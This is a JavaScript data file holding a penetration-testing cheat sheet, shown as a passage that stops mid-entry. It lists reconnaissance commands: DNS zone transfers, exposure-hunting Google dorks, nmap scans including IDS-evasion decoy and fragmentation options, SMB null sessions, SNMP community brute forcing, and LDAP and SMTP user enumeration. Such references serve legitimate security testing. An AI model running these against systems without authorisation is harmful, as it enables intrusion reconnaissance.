// cheat-sheet Command Database
module.exports = [
  {
    "id": "recon",
    "name": "Target Profiling & Network Mapping",
    "icon": "🔍",
    "description": "Enumerate targets through passive intelligence gathering, active scanning, and service fingerprinting to build a complete attack surface map.",
    "subcategories": [
      {
        "name": "Passive Intelligence",
        "commands": [
          {
            "title": "WHOIS Domain Lookup",
            "desc": "Query WHOIS records for domain registration details",
            "cmd": "whois <DOMAIN>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "WHOIS IP Lookup",
            "desc": "Query WHOIS for IP address ownership and netblock info",
            "cmd": "whois <TARGET_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "DNS A Record Lookup",
            "desc": "Resolve domain to IPv4 address using dig",
            "cmd": "dig A <DOMAIN>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "DNS MX Record Lookup",
            "desc": "Enumerate mail exchange servers",
            "cmd": "dig MX <DOMAIN>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "DNS NS Record Lookup",
            "desc": "Enumerate authoritative nameservers",
            "cmd": "dig NS <DOMAIN>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "DNS TXT Records",
            "desc": "Retrieve TXT records (SPF, DKIM, DMARC)",
            "cmd": "dig TXT <DOMAIN>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "DNS ANY Records",
            "desc": "Request all DNS record types at once",
            "cmd": "dig ANY <DOMAIN> @<DNS_SERVER>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "DNS Zone Transfer Attempt",
            "desc": "Attempt AXFR zone transfer from nameserver",
            "cmd": "dig axfr <DOMAIN> @<DNS_SERVER>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Host DNS Lookup",
            "desc": "Simple DNS resolution with host command",
            "cmd": "host <DOMAIN>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Host Reverse DNS",
            "desc": "Reverse lookup IP to hostname",
            "cmd": "host <TARGET_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "DNSRecon Standard Enumeration",
            "desc": "Automated DNS enumeration with multiple record types",
            "cmd": "dnsrecon -d <DOMAIN>",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "DNSRecon Zone Transfer",
            "desc": "Attempt zone transfer via dnsrecon",
            "cmd": "dnsrecon -d <DOMAIN> -t axfr",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "DNSRecon Brute Force",
            "desc": "Brute force subdomains with wordlist",
            "cmd": "dnsrecon -d <DOMAIN> -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t brt",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "DNSEnum Full Enumeration",
            "desc": "Comprehensive DNS enumeration with zone transfer and brute force",
            "cmd": "dnsenum <DOMAIN>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Sublist3r Subdomain Enum",
            "desc": "Enumerate subdomains using search engines and public sources",
            "cmd": "sublist3r -d <DOMAIN>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Amass Passive Enum",
            "desc": "Passive subdomain enumeration with Amass",
            "cmd": "amass enum -passive -d <DOMAIN>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Amass Active Enum",
            "desc": "Active subdomain enumeration with brute force",
            "cmd": "amass enum -active -d <DOMAIN> -brute -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
            "tags": [
              "tool",
              "advanced"
            ]
          },
          {
            "title": "theHarvester Email & Subdomain Enum",
            "desc": "Gather emails, subdomains, hosts from public sources",
            "cmd": "theHarvester -d <DOMAIN> -b all -l 500",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Shodan Host Info",
            "desc": "Query Shodan for target IP information",
            "cmd": "shodan host <TARGET_IP>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Shodan Domain Search",
            "desc": "Search Shodan for hosts related to a domain",
            "cmd": "shodan search hostname:<DOMAIN>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Google Dork - Site Files",
            "desc": "Find exposed files on a domain",
            "cmd": "site:<DOMAIN> filetype:pdf OR filetype:doc OR filetype:xls OR filetype:txt",
            "tags": [
              "essential"
            ],
            "note": "Use in browser or via googler CLI"
          },
          {
            "title": "Google Dork - Login Pages",
            "desc": "Discover login portals",
            "cmd": "site:<DOMAIN> inurl:login OR inurl:admin OR inurl:portal",
            "tags": [
              "essential"
            ],
            "note": "Use in browser"
          },
          {
            "title": "Google Dork - Directory Listings",
            "desc": "Find open directory listings",
            "cmd": "site:<DOMAIN> intitle:\"index of /\"",
            "tags": [
              "essential"
            ],
            "note": "Use in browser"
          },
          {
            "title": "Google Dork - Config Files",
            "desc": "Locate exposed configuration files",
            "cmd": "site:<DOMAIN> ext:xml OR ext:conf OR ext:cnf OR ext:ini OR ext:env OR ext:yml",
            "tags": [
              "essential"
            ],
            "note": "Use in browser"
          },
          {
            "title": "Google Dork - Database Files",
            "desc": "Find exposed database dumps",
            "cmd": "site:<DOMAIN> ext:sql OR ext:db OR ext:bak OR ext:log",
            "tags": [
              "essential"
            ],
            "note": "Use in browser"
          },
          {
            "title": "Google Dork - Sensitive Directories",
            "desc": "Discover backup or sensitive paths",
            "cmd": "site:<DOMAIN> inurl:backup OR inurl:old OR inurl:temp OR inurl:dev",
            "tags": [
              "essential"
            ],
            "note": "Use in browser"
          },
          {
            "title": "DMITRY Deep Information Gathering",
            "desc": "Gather WHOIS, netcraft, subdomain, email, and port info",
            "cmd": "dmitry -winsep <DOMAIN>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Fierce DNS Recon",
            "desc": "DNS reconnaissance and subdomain brute force",
            "cmd": "fierce --domain <DOMAIN>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Dig Reverse DNS Lookup",
            "desc": "Reverse DNS lookup via dig",
            "cmd": "dig -x <TARGET_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Dig Short Answer",
            "desc": "Get only the answer section from dig",
            "cmd": "dig +short <DOMAIN>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Dig AAAA (IPv6) Record",
            "desc": "Query IPv6 AAAA records",
            "cmd": "dig AAAA <DOMAIN>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Dig SRV Records",
            "desc": "Query SRV records for service discovery",
            "cmd": "dig SRV _ldap._tcp.<DOMAIN>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Dig with Specific DNS Server",
            "desc": "Query a specific DNS server",
            "cmd": "dig <DOMAIN> @8.8.8.8",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Nslookup Interactive",
            "desc": "Interactive DNS queries with nslookup",
            "cmds": [
              "nslookup",
              "server <DNS_SERVER>",
              "set type=any",
              "<DOMAIN>"
            ],
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Nslookup Reverse Lookup",
            "desc": "Reverse DNS lookup with nslookup",
            "cmd": "nslookup <TARGET_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Traceroute to Target",
            "desc": "Trace network path to target",
            "cmd": "traceroute <TARGET_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Traceroute TCP",
            "desc": "TCP traceroute to bypass ICMP filtering",
            "cmd": "traceroute -T -p 80 <TARGET_IP>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Ping Sweep (Bash Loop)",
            "desc": "Quick ping sweep using bash for loop",
            "cmd": "for i in $(seq 1 254); do (ping -c 1 -W 1 <SUBNET>.$i | grep 'from' &); done; wait",
            "tags": [
              "essential"
            ],
            "note": "Replace <SUBNET> with the first three octets"
          },
          {
            "title": "Ping Sweep (Nmap)",
            "desc": "Ping sweep with Nmap ARP discovery",
            "cmd": "nmap -sn -PR <SUBNET>/24",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "NBTScan Subnet Scan",
            "desc": "Scan subnet for NetBIOS names and MACs",
            "cmd": "nbtscan -r <SUBNET>/24",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Finger User Enumeration Script",
            "desc": "Enumerate common users via finger service",
            "cmd": "for user in root admin guest test; do finger $user@<TARGET_IP>; done",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "nslookup Forward",
            "desc": "Resolve domain",
            "cmd": "nslookup <DOMAIN>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "nslookup Reverse",
            "desc": "Reverse DNS",
            "cmd": "nslookup <TARGET_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "nslookup Server",
            "desc": "Query specific DNS server",
            "cmd": "nslookup <DOMAIN> <DNS_SERVER>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "nslookup MX",
            "desc": "Query MX records",
            "cmd": "nslookup -type=mx <DOMAIN>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Waybackurls",
            "desc": "Fetch historical URLs",
            "cmd": "waybackurls <DOMAIN> | sort -u | tee wayback.txt",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "GAU — Get All URLs",
            "desc": "Fetch URLs from multiple sources",
            "cmd": "gau <DOMAIN> | sort -u | tee gau.txt",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Katana Web Crawler",
            "desc": "Fast endpoint discovery",
            "cmd": "katana -u http://<TARGET_IP> -d 3 -o katana.txt",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Hakrawler",
            "desc": "Simple web crawler",
            "cmd": "echo http://<TARGET_IP> | hakrawler -d 3",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "GoSpider",
            "desc": "Web spider for links",
            "cmd": "gospider -s http://<TARGET_IP> -d 3 -o gospider_out",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Parsero robots.txt",
            "desc": "Parse robots.txt for hidden paths",
            "cmd": "parsero -u http://<TARGET_IP>",
            "tags": [
              "tool"
            ]
          }
        ]
      },
      {
        "name": "Active Port Scanning",
        "commands": [
          {
            "title": "Nmap SYN Scan (Stealth)",
            "desc": "Fast SYN scan on all ports — the default go-to scan",
            "cmd": "nmap -sS -p- --min-rate 5000 -Pn -n <TARGET_IP> -oN nmap_syn.txt",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Nmap TCP Connect Scan",
            "desc": "Full TCP handshake scan — use when SYN scan is not available",
            "cmd": "nmap -sT -p- --min-rate 5000 -Pn -n <TARGET_IP> -oN nmap_connect.txt",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Nmap UDP Scan (Top Ports)",
            "desc": "Scan top UDP ports for common services",
            "cmd": "nmap -sU --top-ports 200 --min-rate 5000 -Pn -n <TARGET_IP> -oN nmap_udp.txt",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Nmap Quick Top 1000",
            "desc": "Fast scan of default top 1000 TCP ports",
            "cmd": "nmap -sS --min-rate 5000 -Pn -n <TARGET_IP> -oN nmap_quick.txt",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Nmap Specific Port Scan",
            "desc": "Scan specific ports of interest",
            "cmd": "nmap -sS -p <PORT1>,<PORT2>,<PORT3> -Pn -n <TARGET_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Nmap Ping Sweep",
            "desc": "Discover live hosts on a subnet",
            "cmd": "nmap -sn <SUBNET>/24 -oN nmap_sweep.txt",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Nmap List Scan",
            "desc": "List targets without scanning (DNS resolution only)",
            "cmd": "nmap -sL <SUBNET>/24",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Masscan Full Port Scan",
            "desc": "Ultra-fast port scanning on all TCP ports",
            "cmd": "masscan -p1-65535 <TARGET_IP> --rate=1000 -e tun0 --router-ip <GATEWAY_IP>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Masscan Top Ports",
            "desc": "Fast scan of common ports with masscan",
            "cmd": "masscan -p 21,22,23,25,53,80,110,139,443,445,993,995,1433,3306,3389,5432,8080,8443 <TARGET_IP> --rate=1000",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "RustScan Quick Scan",
            "desc": "Lightning-fast port scan with automatic nmap handoff",
            "cmd": "rustscan -a <TARGET_IP> --ulimit 5000 -- -sV -sC",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "RustScan Specific Ports",
            "desc": "RustScan with specific port range",
            "cmd": "rustscan -a <TARGET_IP> -r 1-65535 --ulimit 5000 -- -A",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Traceroute TCP",
            "desc": "TCP SYN traceroute",
            "cmd": "traceroute -T -p <PORT> <TARGET_IP>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Traceroute ICMP",
            "desc": "Standard ICMP traceroute",
            "cmd": "traceroute -I <TARGET_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "fping Sweep",
            "desc": "Fast subnet ping sweep",
            "cmd": "fping -asgq <NETWORK>/<CIDR>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Arping Layer 2",
            "desc": "ARP host discovery",
            "cmd": "arping -c 3 <TARGET_IP>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Netdiscover ARP",
            "desc": "ARP reconnaissance",
            "cmd": "sudo netdiscover -r <NETWORK>/<CIDR>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Nmap Zombie Scan",
            "desc": "Stealth idle scan",
            "cmd": "nmap -sI <ZOMBIE_IP> -p <PORTS> <TARGET_IP>",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "Nmap Decoy Scan",
            "desc": "Scan with decoy IPs",
            "cmd": "nmap -D RND:10 -p <PORTS> <TARGET_IP>",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "Nmap MAC Spoof",
            "desc": "Spoof MAC address",
            "cmd": "nmap --spoof-mac 0 -p <PORTS> <TARGET_IP>",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "Nmap Fragment",
            "desc": "Fragment packets for evasion",
            "cmd": "nmap -f -p <PORTS> <TARGET_IP>",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "Nmap Data Length",
            "desc": "Add padding to evade IDS",
            "cmd": "nmap --data-length 50 -p <PORTS> <TARGET_IP>",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "Bash Ping Sweep",
            "desc": "Quick subnet sweep",
            "cmd": "for i in $(seq 1 254); do (ping -c 1 <NETWORK>.$i | grep 'bytes from' &); done; wait",
            "tags": [
              "essential"
            ]
          }
        ]
      },
      {
        "name": "Service Fingerprinting",
        "commands": [
          {
            "title": "Nmap Service Version Detection",
            "desc": "Probe open ports for service versions on discovered ports",
            "cmd": "nmap -sV -sC -p <PORTS> -Pn -n <TARGET_IP> -oN nmap_svc.txt",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Nmap Aggressive Scan",
            "desc": "OS detection, version, scripts, and traceroute",
            "cmd": "nmap -A -p <PORTS> -Pn -n <TARGET_IP> -oN nmap_aggressive.txt",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Nmap OS Detection",
            "desc": "Attempt operating system fingerprinting",
            "cmd": "nmap -O -p <PORTS> -Pn <TARGET_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Nmap Default Scripts",
            "desc": "Run default NSE script suite against services",
            "cmd": "nmap -sC -p <PORTS> -Pn -n <TARGET_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Nmap All Scripts Safe",
            "desc": "Run all safe-category NSE scripts",
            "cmd": "nmap --script safe -p <PORTS> -Pn -n <TARGET_IP>",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "Nmap Vulnerability Scripts",
            "desc": "Run vulnerability scanning scripts",
            "cmd": "nmap --script vuln -p <PORTS> -Pn -n <TARGET_IP> -oN nmap_vuln.txt",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Nmap Script Category Run",
            "desc": "Run specific NSE script categories",
            "cmd": "nmap --script \"discovery and safe\" -p <PORTS> -Pn -n <TARGET_IP>",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "Netcat Banner Grab",
            "desc": "Connect to service and grab banner manually",
            "cmd": "nc -nv <TARGET_IP> <PORT>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Nmap Banner Grab Script",
            "desc": "Grab service banners via NSE",
            "cmd": "nmap --script banner -p <PORTS> -Pn -n <TARGET_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Nmap Version Intensity Max",
            "desc": "Maximum version detection intensity",
            "cmd": "nmap -sV --version-intensity 5 -p <PORTS> -Pn -n <TARGET_IP>",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "Nmap HTTP Enum",
            "desc": "Enumerate web directories",
            "cmd": "nmap --script http-enum -p 80,443,8080 <TARGET_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Nmap DNS Brute",
            "desc": "Brute force subdomains",
            "cmd": "nmap --script dns-brute --script-args dns-brute.domain=<DOMAIN>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Nmap FTP Anon",
            "desc": "Check anonymous FTP",
            "cmd": "nmap --script ftp-anon -p 21 <TARGET_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Nmap MySQL Info",
            "desc": "Enumerate MySQL",
            "cmd": "nmap --script mysql-info -p 3306 <TARGET_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Nmap MSSQL Info",
            "desc": "Enumerate MSSQL",
            "cmd": "nmap --script ms-sql-info -p 1433 <TARGET_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Nmap RDP Info",
            "desc": "Extract RDP hostname/domain",
            "cmd": "nmap --script rdp-ntlm-info -p 3389 <TARGET_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Nmap VNC Info",
            "desc": "Enumerate VNC",
            "cmd": "nmap --script vnc-info -p 5900 <TARGET_IP>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Nmap Redis Info",
            "desc": "Get Redis info",
            "cmd": "nmap --script redis-info -p 6379 <TARGET_IP>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Nmap MongoDB",
            "desc": "Enumerate MongoDB",
            "cmd": "nmap --script mongodb-databases -p 27017 <TARGET_IP>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Nmap NFS Shares",
            "desc": "List NFS exports",
            "cmd": "nmap --script nfs-ls,nfs-showmount -p 111,2049 <TARGET_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "RPCinfo",
            "desc": "List RPC services",
            "cmd": "rpcinfo -p <TARGET_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Showmount NFS",
            "desc": "Show NFS directories",
            "cmd": "showmount -e <TARGET_IP>",
            "tags": [
              "essential"
            ]
          }
        ]
      },
      {
        "name": "SMB & NetBIOS Probing",
        "commands": [
          {
            "title": "Enum4linux Full Enumeration",
            "desc": "Enumerate SMB shares, users, groups, policies",
            "cmd": "enum4linux -a <TARGET_IP>",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "Enum4linux-ng Full Scan",
            "desc": "Modern Python rewrite with JSON output",
            "cmd": "enum4linux-ng -A <TARGET_IP>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "SMBClient List Shares (Null)",
            "desc": "List SMB shares with null session",
            "cmd": "smbclient -L //<TARGET_IP> -N",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "SMBClient Connect to Share",
            "desc": "Connect to a specific share",
            "cmd": "smbclient //<TARGET_IP>/<SHARE> -U <USER>%<PASS>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "SMBClient Null Auth Connect",
            "desc": "Connect to share with null session",
            "cmd": "smbclient //<TARGET_IP>/<SHARE> -N",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "SMBMap Enumerate Shares",
            "desc": "Enumerate shares and permissions",
            "cmd": "smbmap -H <TARGET_IP>",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "SMBMap Authenticated",
            "desc": "Enumerate shares with credentials",
            "cmd": "smbmap -H <TARGET_IP> -u <USER> -p <PASS>",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "SMBMap Recursive Listing",
            "desc": "Recursively list files in a share",
            "cmd": "smbmap -H <TARGET_IP> -u <USER> -p <PASS> -r <SHARE>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "SMBMap Download File",
            "desc": "Download a file from a share",
            "cmd": "smbmap -H <TARGET_IP> -u <USER> -p <PASS> --download '<SHARE>\\path\\to\\file'",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "CrackMapExec SMB Enum",
            "desc": "Enumerate SMB info, shares, users",
            "cmd": "crackmapexec smb <TARGET_IP>",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "CrackMapExec SMB Shares",
            "desc": "List shares with credentials",
            "cmd": "crackmapexec smb <TARGET_IP> -u <USER> -p <PASS> --shares",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "CrackMapExec SMB Users",
            "desc": "Enumerate domain users via SMB",
            "cmd": "crackmapexec smb <TARGET_IP> -u <USER> -p <PASS> --users",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "CrackMapExec SMB Sessions",
            "desc": "Enumerate active sessions",
            "cmd": "crackmapexec smb <TARGET_IP> -u <USER> -p <PASS> --sessions",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Nmap SMB Enum Shares",
            "desc": "Enumerate SMB shares via NSE",
            "cmd": "nmap --script smb-enum-shares -p 445 -Pn <TARGET_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Nmap SMB Enum Users",
            "desc": "Enumerate SMB users via NSE",
            "cmd": "nmap --script smb-enum-users -p 445 -Pn <TARGET_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Nmap SMB OS Discovery",
            "desc": "Discover OS via SMB",
            "cmd": "nmap --script smb-os-discovery -p 445 -Pn <TARGET_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Nmap SMB Vuln Scan",
            "desc": "Check for known SMB vulnerabilities",
            "cmd": "nmap --script smb-vuln* -p 445 -Pn <TARGET_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "NBTScan NetBIOS Enum",
            "desc": "Scan subnet for NetBIOS name information",
            "cmd": "nbtscan <SUBNET>/24",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "NBTScan Single Host",
            "desc": "Get NetBIOS info for single target",
            "cmd": "nbtscan -v <TARGET_IP>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "NBTScan Subnet",
            "desc": "NetBIOS name scan",
            "cmd": "nbtscan -r <NETWORK>/<CIDR>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "enum4linux-ng",
            "desc": "Next-gen SMB enumeration",
            "cmd": "enum4linux-ng -A <TARGET_IP>",
            "tags": [
              "tool"
            ]
          }
        ]
      },
      {
        "name": "SNMP Discovery",
        "commands": [
          {
            "title": "SNMPWalk Full Tree",
            "desc": "Walk the entire SNMP MIB tree with community string",
            "cmd": "snmpwalk -v2c -c public <TARGET_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "SNMPWalk System Info",
            "desc": "Retrieve system description",
            "cmd": "snmpwalk -v2c -c public <TARGET_IP> 1.3.6.1.2.1.1",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "SNMPWalk Running Processes",
            "desc": "Enumerate running processes via SNMP",
            "cmd": "snmpwalk -v2c -c public <TARGET_IP> 1.3.6.1.2.1.25.4.2.1.2",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "SNMPWalk Installed Software",
            "desc": "Enumerate installed software",
            "cmd": "snmpwalk -v2c -c public <TARGET_IP> 1.3.6.1.2.1.25.6.3.1.2",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "SNMPWalk TCP Connections",
            "desc": "Enumerate active TCP connections",
            "cmd": "snmpwalk -v2c -c public <TARGET_IP> 1.3.6.1.2.1.6.13.1.3",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "SNMPWalk User Accounts",
            "desc": "Enumerate Windows user accounts via SNMP",
            "cmd": "snmpwalk -v2c -c public <TARGET_IP> 1.3.6.1.4.1.77.1.2.25",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "OneSixtyOne Community Brute",
            "desc": "Brute force SNMP community strings",
            "cmd": "onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <TARGET_IP>",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "SNMP-Check Full Enum",
            "desc": "Comprehensive SNMP enumeration",
            "cmd": "snmp-check <TARGET_IP> -c public",
            "tags": [
              "tool"
            ]
          }
        ]
      },
      {
        "name": "LDAP & RPC Queries",
        "commands": [
          {
            "title": "LDAPSearch Anonymous Bind",
            "desc": "Attempt anonymous LDAP enumeration",
            "cmd": "ldapsearch -x -H ldap://<TARGET_IP> -b '' -s base namingcontexts",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "LDAPSearch Dump All",
            "desc": "Dump entire LDAP directory with credentials",
            "cmd": "ldapsearch -x -H ldap://<TARGET_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'DC=<DOMAIN_PART1>,DC=<DOMAIN_PART2>'",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "LDAPSearch Find Users",
            "desc": "Extract all user objects from LDAP",
            "cmd": "ldapsearch -x -H ldap://<TARGET_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'DC=<DOMAIN_PART1>,DC=<DOMAIN_PART2>' '(objectClass=user)' sAMAccountName",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "LDAPSearch Find Computers",
            "desc": "Extract computer objects from LDAP",
            "cmd": "ldapsearch -x -H ldap://<TARGET_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'DC=<DOMAIN_PART1>,DC=<DOMAIN_PART2>' '(objectClass=computer)' cn",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "RPCClient Null Session",
            "desc": "Connect with null session to enumerate",
            "cmd": "rpcclient -U '' -N <TARGET_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "RPCClient Enum Domain Users",
            "desc": "Enumerate domain users via RPC",
            "cmd": "rpcclient -U '' -N <TARGET_IP> -c 'enumdomusers'",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "RPCClient Enum Domain Groups",
            "desc": "Enumerate domain groups via RPC",
            "cmd": "rpcclient -U '' -N <TARGET_IP> -c 'enumdomgroups'",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "RPCClient Query User",
            "desc": "Get details for a specific user RID",
            "cmd": "rpcclient -U '' -N <TARGET_IP> -c 'queryuser 0x1f4'",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "RPCClient Enum Printers",
            "desc": "Enumerate printers via RPC",
            "cmd": "rpcclient -U '' -N <TARGET_IP> -c 'enumprinters'",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "RPCClient Server Info",
            "desc": "Get server info via RPC",
            "cmd": "rpcclient -U '' -N <TARGET_IP> -c 'srvinfo'",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Finger User Enumeration",
            "desc": "Enumerate users via finger service",
            "cmd": "finger @<TARGET_IP>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Finger Specific User",
            "desc": "Query specific user via finger",
            "cmd": "finger <USER>@<TARGET_IP>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Ident User Enum",
            "desc": "Enumerate users via identd service",
            "cmd": "ident-user-enum <TARGET_IP> 22 113 445",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "SMTP User Enum VRFY",
            "desc": "Enumerate users via SMTP VRFY command",
            "cmd": "smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t <TARGET_IP>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "SMTP User Enum RCPT",
            "desc": "Enumerate users via SMTP RCPT TO",
            "cmd": "smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/Names/names.txt -t <TARGET_IP>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Finger Enumeration",
            "desc": "Enumerate users via finger",
            "cmd": "finger @<TARGET_IP>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "SMTP User VRFY",
            "desc": "Verify users via SMTP",
            "cmd": "smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t <TARGET_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "SMTP User RCPT",
            "desc": "Enumerate via RCPT TO",
            "cmd": "smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t <TARGET_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "SMTP User EXPN",
            "desc": "Expand mailing lists",
            "cmd": "smtp-user-enum -M EXPN -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t <TARGET_IP>",
            "tags": [
              "tool"
            ]
          }
        ]
      },
      {
        "name": "HTTP Footprinting",
        "commands": [
          {
            "title": "WhatWeb Fingerprint",
            "desc": "Identify web technologies and CMS",
            "cmd": "whatweb <TARGET_IP>",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "WhatWeb Aggressive",
            "desc": "Aggressive web technology fingerprinting",
            "cmd": "whatweb -a 3 http://<TARGET_IP>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Curl Headers",
            "desc": "Retrieve HTTP response headers",
            "cmd": "curl -I http://<TARGET_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Curl Full Response",
            "desc": "Get full HTTP response with headers",
            "cmd": "curl -v http://<TARGET_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Curl Follow Redirects",
            "desc": "Follow redirects and show final page",
